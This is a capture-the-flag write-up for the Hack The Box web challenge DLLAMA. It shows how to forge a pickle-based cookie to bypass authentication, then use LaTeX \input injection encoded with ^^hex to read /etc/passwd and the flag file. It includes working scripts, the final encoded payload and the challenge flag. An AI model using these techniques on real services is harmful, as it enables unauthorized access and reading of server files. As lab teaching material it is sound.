# DLLAMA Challenge

**Platform:** Hack The Box

**Author:** 0xL0m4

**Category:** Web (Medium)

<img width="1520" height="175" alt="image" src="https://github.com/user-attachments/assets/62e88734-8d7d-4852-bfe4-96cd36704710" />

## Challenge Description
Welcome, friend. fsociety has discovered a dangerous LaTeX application hidden by a notorious digital outlaw within E Corp's systems. As a top member of fsociety, it's your duty to uncover and neutralize this threat before it wreaks havoc.


## Tools Used

* Burp Suite
* Browser Developer Tools
* Python

## Steps

### 1. Exploring the website

I started by opening the website and downloading the source code.

I found a login page that only required a username.

I tried:

```
admin
```

However, the application returned an error indicating that the user was not authenticated.

So, I decided to analyze the source code to understand how the authentication mechanism worked.

<img width="1341" height="866" alt="image" src="https://github.com/user-attachments/assets/04ca4657-916e-464a-beef-eb9abebe0d26" />


### 2. the authentication logic

In the source code, I found the /login route:

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    error = request.args.get('error')
    if request.method == 'POST':
        username = request.form.get('username')

        # Create a user with authenticated set to False by default
        user = User(username, authenticated=False)

        user_cookie = base64.b64encode(
            pickle.dumps(user)
        ).decode('utf-8')

        resp = make_response(redirect(url_for('index')))
        resp.set_cookie('user', user_cookie)

        return resp

    return render_template('login.html', error=error)
```

The interesting part was:

```
user = User(username, authenticated=False)
```

The application creates a User object with: authenticated = False

Then it serializes this object using Python's pickle module:

```
pickle.dumps(user)
```

After that, the serialized object is Base64 encoded and stored inside the user cookie.

I then checked how this cookie was used in the main route.

```python
@app.route('/', methods=['GET', 'POST'])
def index():
    user_cookie = request.cookies.get('user')

    if user_cookie:
        try:
            user = restricted_loads(
                base64.b64decode(user_cookie)
            )
        except pickle.UnpicklingError:
            return redirect(
                url_for('login', error='Invalid cookie data')
            )

        if not user.authenticated:
            return redirect(
                url_for('login', error='User is not authenticated')
            )
```

The important check was 'if not user.authenticated'

This means the application decides whether the user is authenticated based on the authenticated attribute inside the serialized object.

At this point, I wondered what if I modify the serialized User object and change authenticated from False to True?

### 3. Manipulating the Pickle cookie

The cookie contained a serialized Python User object.

I decoded the Base64 value and loaded the object using pickle.loads().

Then I changed:

```python
user.authenticated = True
```

and serialized the modified object again using pickle.dumps().

I used the following script:

```python
import base64
import pickle

str1 = "gASVQQAAAAAAAACMCF9fbWFpbl9flIwEVXNlcpSTlCmBlH2UKIwIdXNlcm5hbWWUjAVhZG1pbnSMDWF1dGhlbnRpY2F0ZWSUiXViLg=="

str2 = base64.b64decode(str1)

class User:
    def __init__(self, username, authenticated=True):
        self.username = username
        self.authenticated = authenticated


user = pickle.loads(str2)
user.authenticated = True

cookie = base64.b64encode(pickle.dumps(user))

print(cookie.decode())
```

Why do we use the User class?

The Pickle data represents an actual Python object of type User, not just a normal dictionary.

When pickle.loads() reconstructs the object, Python needs to know what the User class is.

That's why I recreated the class locally:

```python
class User:
    def __init__(self, username, authenticated=True):
        self.username = username
        self.authenticated = authenticated
```

Then I decoded the cookie:

```python
str2 = base64.b64decode(str1)
```

and deserialized it:

```python
user = pickle.loads(str2)
```

This gave me the User object.

I then changed the authentication state:

```python
user.authenticated = True
```

Finally, I serialized the modified object and encoded it again:

```python
cookie = base64.b64encode(pickle.dumps(user))
```

### 4. Bypassing authentication

I replaced the original user cookie with the generated value and accessed: /

And yessss!

I was successfully redirected to the main page.


### 5. Exploring the LaTeX functionality

After bypassing the authentication, I discovered that the application allows users to submit LaTeX code and converts it into a PDF.

The relevant code was:

```python
latex_code = request.form.get("latex_code", "")
pdf_file = generate_pdf(latex_code)
```

This immediately caught my attention because LaTeX provides commands that can read files from the filesystem.

For example:

```
\input{flag.txt}
```

can be used to include the contents of a file in the generated document.

I checked the Dockerfile to find the location of the flag.

The flag was located at:

```
/app/flag.txt
```

So my goal was to make the LaTeX renderer read this file.

A basic LaTeX document would look like:

```latex
\documentclass{article}
\title{Alslam alykom hackers!!!}
\author{0xl0m4}

\begin{document}

\input{flag.txt}

\end{document}
```

For the basic LaTeX document structure, I used:

[Useful Article](https://guides.nyu.edu/LaTeX/sample-document)

### 6. Bypassing the character filter

There was another problem.

The application restricts the characters allowed in the LaTeX code:

```python
invalid_chars = re.findall(r'[^a-fA-F0-9^\n\t\r ]', latex_code)
```

This means that only:

```text
a-f
A-F
0-9
^
whitespace
\n
\t
\r
```

are allowed.

Characters such as:

```text
\
{
}
```
are therefore blocked.

This meant that a normal payload such as:

```
\input{/etc/passwd}
```

would not work.

So I needed another way to represent the forbidden characters.

### 7. Using LaTeX hexadecimal encoding

While looking at the allowed characters, I noticed that `^` and hexadecimal characters were permitted.

LaTeX supports `^^` notation for representing characters using hexadecimal values.

For example:

```text
\ = 0x5c
```

can be represented as:

```text
^^5c
```

I wrote a Python script to convert the LaTeX payload:

```
text = b'\\documentclass{article}\\title{Alslam alykom hackers!!!}\\author{0xl0m4}\\begin{document}\\input{/etc/passwd}\\end{document}'

result = "".join(f"^^{hex(c)[2:]}" for c in text)

print(result)
```


```python
f"^^{hex(c)[2:]}"
```

For every byte, the script gets its hexadecimal representation and prepends `^^`.

The double backslash in the Python byte string is used so Python produces a literal \ character.

### 8. Testing with /etc/passwd

Before trying to read the flag, I decided to test the technique with:

```
/etc/passwd
```

After converting the payload into hexadecimal, I submitted it to the LaTeX field.

And yesss!

The contents of /etc/passwd were successfully retrieved.

This confirmed that I could use the LaTeX renderer to read local files.

### 9. Reading the flag

Now I changed the target from:

```text
/etc/passwd
```

to:

```text
/app/flag.txt
```

However, the payload failed.

Most probably, the problem was that the flag contained _.

In LaTeX, _ is a special character and is normally interpreted as a subscript operator (x_1 --> x₁).

LaTeX would try to interpret _ instead of treating it as normal text.

<img width="1920" height="622" alt="image" src="https://github.com/user-attachments/assets/a022fa6f-3002-470d-8845-4381807fb2db" />


### 10. Using catcode to handle "_"

To solve this, I used LaTeX's catcode mechanism.

I added:

```
\catcode`\_=12
```

This changes the category code of _ to 12.

Category code 12 means that the character is treated as an ordinary character rather than having its special LaTeX meaning.

So _ will be treated as normal text when the flag is included.

The final LaTeX payload became:

```latex
\documentclass{article}
\title{Alslam alykom hackers!!!}
\author{0xl0m4}

\begin{document}

\catcode`\_=12
\input{/app/flag.txt}

\end{document}
```

I then converted the payload into the same hexadecimal representation.

The script was:

```python
text = b'\\documentclass{article}\\title{Alslam alykom hackers!!!}\\author{0xl0m4}\\begin{document}\\catcode`\\_=12\\input{/app/flag.txt}\\end{document}'

result = "".join(f"^^{hex(c)[2:]}" for c in text)

print(result)
```

The resulting payload was:

```
^^5c^^64^^6f^^63^^75^^6d^^65^^6e^^74^^63^^6c^^61^^73^^73^^7b^^61^^72^^74^^69^^63^^6c^^65^^7d^^5c^^74^^69^^74^^6c^^65^^7b^^41^^6c^^73^^6c^^61^^6d^^20^^61^^6c^^79^^6b^^6f^^6d^^20^^68^^61^^63^^6b^^65^^72^^73^^21^^21^^21^^7d^^5c^^61^^75^^74^^68^^6f^^72^^7b^^30^^78^^6c^^30^^6d^^34^^7d^^5c^^62^^65^^67^^69^^6e^^7b^^64^^6f^^63^^75^^6d^^65^^6e^^74^^7d^^5c^^63^^61^^74^^63^^6f^^64^^65^^60^^5c^^5f^^3d^^31^^32^^5c^^69^^6e^^70^^75^^74^^7b^^2f^^61^^70^^70^^2f^^66^^6c^^61^^67^^2e^^74^^78^^74^^7d^^5c^^65^^6e^^64^^7b^^64^^6f^^63^^75^^6d^^65^^6e^^74^^7d
```

I submitted the encoded payload to the LaTeX section.

Voilaaaa!!

The content of the flag file were successfully retrieved.

**Note:** You can also use flag.txt instead of /app/flag.txt because i think the LaTeX process is running from the /app directory.

<img width="1345" height="610" alt="image" src="https://github.com/user-attachments/assets/4393b052-7973-4731-a4f3-614358d78c96" />


### The Flag

The application returned:

```text
HTBWH0˙5t1ll˙us1ng˙L\@TeX˙1n˙2024?˙f0r˙R34l
```

After formatting the special characters correctly:

```text
HTB{WH0_5t1ll_us1ng_L\@TeX_1n_2024?_f0r_R34l}
```

#

[The challenge link](https://app.hackthebox.com/challenges/DLLAMA?tab=play_challenge)

See you in the next writeup, In sha Allah!

سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
